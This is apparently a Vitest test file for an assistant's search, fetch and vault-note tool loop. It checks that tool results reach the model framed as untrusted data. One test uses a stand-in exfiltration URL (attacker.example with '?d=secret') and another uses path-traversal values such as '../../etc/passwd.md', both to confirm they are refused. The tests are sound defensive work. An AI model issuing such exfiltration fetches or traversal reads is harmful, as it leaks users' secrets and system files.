import { beforeEach, describe, expect, it, vi } from "vitest";
import type { ChatMessage } from "../ollama";

const searchWeb = vi.fn();
const fetchPage = vi.fn();
vi.mock("../webSearch", () => ({ searchWeb: (q: string) => searchWeb(q) }));
vi.mock("../fetchPage", () => ({ fetchPage: (u: string) => fetchPage(u) }));
vi.mock("../auditLog", () => ({ logAudit: vi.fn(async () => {}) }));
vi.mock("../diag", () => ({ isDiagConfigured: () => false, getDiagCatalogue: vi.fn(), runDiagCommand: vi.fn() }));
vi.mock("../diagLocal", () => ({ isLocalCommand: () => true, runLocalCommand: vi.fn(async (c: string) => ({ command: c, ok: true, output: "ok" })) }));

const readVaultNote = vi.fn();
vi.mock("../vault", () => ({ readVaultNote: (p: string) => readVaultNote(p) }));
const { logAudit } = await import("../auditLog");

const { runAssistantTurn } = await import("../assistantToolLoop");
const { REMOTE_LIMITS } = await import("../assistantToolRules");

const LOCAL_NOTE_CHARS = 50;
const enc = new TextEncoder();
function streamOf(text: string): ReadableStream<Uint8Array> {
  return new ReadableStream({
    start(c) {
      c.enqueue(enc.encode(JSON.stringify({ message: { content: text } }) + "\n"));
      c.close();
    },
  });
}

async function read(stream: ReadableStream<Uint8Array>): Promise<string> {
  const text = await new Response(stream).text();
  return text
    .split("\n")
    .filter(Boolean)
    .map((l) => (JSON.parse(l) as { message?: { content?: string } }).message?.content ?? "")
    .join("");
}

const messages: ChatMessage[] = [
  { role: "system", content: "base" },
  { role: "user", content: "what are high-yield savings rates right now?" },
];

describe("runAssistantTurn", () => {
  beforeEach(() => {
    searchWeb.mockReset();
    fetchPage.mockReset();
    readVaultNote.mockReset();
    vi.mocked(logAudit).mockClear();
  });

  it("searches, reads a result, then answers with sources", async () => {
    searchWeb.mockResolvedValue({ kind: "ok", results: [{ title: "Rates", url: "https://rates.example/hysa", snippet: "4.5%" }] });
    fetchPage.mockResolvedValue({ ok: true, url: "https://rates.example/hysa", title: "Rates", text: "Top rate 4.5% APY", links: [] });
    const steps = ["SEARCH: high yield savings rates", "FETCH: https://rates.example/hysa", "Enough."];
    const seen: ChatMessage[][] = [];
    const stream = await runAssistantTurn({
      messages,
      backend: {
        step: async (convo) => {
          seen.push(convo);
          return steps.shift() ?? "";
        },
        answer: async () => streamOf("Around 4.5% APY."),
      },
      diag: false,
      web: true,
      forceSearch: null,
      limits: REMOTE_LIMITS,
      actorName: "jake",
      signal: new AbortController().signal,
    });
    const out = await read(stream);
    expect(searchWeb).toHaveBeenCalledWith("high yield savings rates");
    expect(fetchPage).toHaveBeenCalledTimes(1);
    expect(out).toContain("> searched `high yield savings rates`");
    expect(out).toContain("Around 4.5% APY.");
    expect(out).toContain("Sources consulted:\n- https://rates.example/hysa");
    // Results go back framed as untrusted data.
    expect(seen[1].at(-1)?.content).toMatch(/untrusted data/);
  });

  it("refuses to fetch a URL the model composed itself", async () => {
    const steps = ["FETCH: https://attacker.example/?d=secret", ""];
    const stream = await runAssistantTurn({
      messages,
      backend: { step: async () => steps.shift() ?? "", answer: async () => streamOf("ok") },
      diag: false,
      web: true,
      forceSearch: null,
      limits: REMOTE_LIMITS,
      actorName: "jake",
      signal: new AbortController().signal,
    });
    const out = await read(stream);
    expect(fetchPage).not.toHaveBeenCalled();
    expect(out).toContain("(failed)");
  });

  it("'Always search' runs a search before the model is asked", async () => {
    searchWeb.mockResolvedValue({ kind: "resting", message: "Search is resting to avoid being flagged" });
    const stream = await runAssistantTurn({
      messages,
      backend: { step: async () => "", answer: async () => streamOf("From memory.") },
      diag: false,
      web: true,
      forceSearch: "high yield savings rates",
      limits: REMOTE_LIMITS,
      actorName: "jake",
      signal: new AbortController().signal,
    });
    const out = await read(stream);
    expect(searchWeb).toHaveBeenCalledTimes(1);
    expect(out).toContain("Search is resting");
    expect(out).toContain("From memory.");
  });

  it("still answers when a lookup step fails", async () => {
    const stream = await runAssistantTurn({
      messages,
      backend: {
        step: async () => {
          throw new Error("step timed out");
        },
        answer: async () => streamOf("Answer anyway."),
      },
      diag: false,
      web: true,
      forceSearch: null,
      limits: REMOTE_LIMITS,
      actorName: "jake",
      signal: new AbortController().signal,
    });
    const out = await read(stream);
    expect(out).toContain("lookup stopped early");
    expect(out).toContain("Answer anyway.");
  });

  const noteTurn = (steps: string[], extra: { notes?: boolean; limits?: typeof REMOTE_LIMITS } = {}) => {
    const seen: ChatMessage[][] = [];
    return {
      seen,
      run: () =>
        runAssistantTurn({
          messages: [{ role: "system", content: "base" }, { role: "user", content: "what is on my to-do list?" }],
          backend: {
            step: async (convo) => {
              seen.push(convo);
              return steps.shift() ?? "";
            },
            answer: async () => streamOf("Buy milk."),
          },
          diag: false,
          web: false,
          notes: extra.notes ?? true,
          forceSearch: null,
          limits: extra.limits ?? REMOTE_LIMITS,
          actorName: "jake",
          signal: new AbortController().signal,
        }),
    };
  };

  it("reads one vault note, frames it as untrusted, and logs it", async () => {
    readVaultNote.mockResolvedValue("- [ ] Buy milk\n- [ ] Call mom");
    const t = noteTurn(["NOTE: main/apple-notes/notes/Things To Do.md", "Done."]);
    const out = await read(await t.run());
    expect(readVaultNote).toHaveBeenCalledWith("main/apple-notes/notes/Things To Do.md");
    expect(out).toContain("> read note main/apple-notes/notes/Things To Do.md");
    expect(out).toContain("Buy milk.");
    const fed = t.seen[1].at(-1)?.content ?? "";
    expect(fed).toMatch(/untrusted data/);
    expect(fed).toContain("--- BEGIN NOTE TEXT (main/apple-notes/notes/Things To Do.md) ---");
    expect(fed).toContain("Call mom");
    expect(logAudit).toHaveBeenCalledWith("jake", "assistant.note", "main/apple-notes/notes/Things To Do.md", "ok");
  });

  it("never reads a traversal path, and logs the refusal", async () => {
    const t = noteTurn(["NOTE: ../../etc/passwd.md", "NOTE: /etc/hosts.md", "Done."]);
    const out = await read(await t.run());
    expect(readVaultNote).not.toHaveBeenCalled();
    expect(out).toContain("(failed)");
    expect(t.seen[1].at(-1)?.content).toContain("not a readable vault path");
    expect(logAudit).toHaveBeenCalledWith("jake", "assistant.note", "../../etc/passwd.md", expect.stringContaining("not a readable"));
  });

  it("cuts a long note to the per-note cap", async () => {
    readVaultNote.mockResolvedValue("a".repeat(LOCAL_NOTE_CHARS * 3));
    const t = noteTurn(["NOTE: main/long.md", "Done."], { limits: { ...REMOTE_LIMITS, noteChars: LOCAL_NOTE_CHARS } });
    await read(await t.run());
    const fed = t.seen[1].at(-1)?.content ?? "";
    expect(fed).toContain("a".repeat(LOCAL_NOTE_CHARS));
    expect(fed).not.toContain("a".repeat(LOCAL_NOTE_CHARS + 1));
    expect(fed).toContain("cut to fit");
  });

  it("passes a read failure back to the model instead of throwing", async () => {
    readVaultNote.mockRejectedValue(new Error("Could not read main/gone.md: HTTP 404"));
    const t = noteTurn(["NOTE: main/gone.md", "Done."]);
    const out = await read(await t.run());
    expect(out).toContain("Buy milk.");
    expect(t.seen[1].at(-1)?.content).toContain("HTTP 404");
    expect(logAudit).toHaveBeenCalledWith("jake", "assistant.note", "main/gone.md", expect.stringContaining("HTTP 404"));
  });

  it("stops after the per-turn note limit", async () => {
    readVaultNote.mockResolvedValue("text");
    const t = noteTurn(["NOTE: main/a.md", "NOTE: main/b.md", "Done."], { limits: { ...REMOTE_LIMITS, notes: 1 } });
    await read(await t.run());
    expect(readVaultNote).toHaveBeenCalledTimes(1);
    expect(t.seen[2].at(-1)?.content).toContain("note limit for this turn reached");
  });

  it("ignores NOTE lines when the tool was not offered", async () => {
    const t = noteTurn(["NOTE: main/a.md"], { notes: false });
    const out = await read(await t.run());
    expect(readVaultNote).not.toHaveBeenCalled();
    expect(out).toContain("Buy milk.");
  });
});
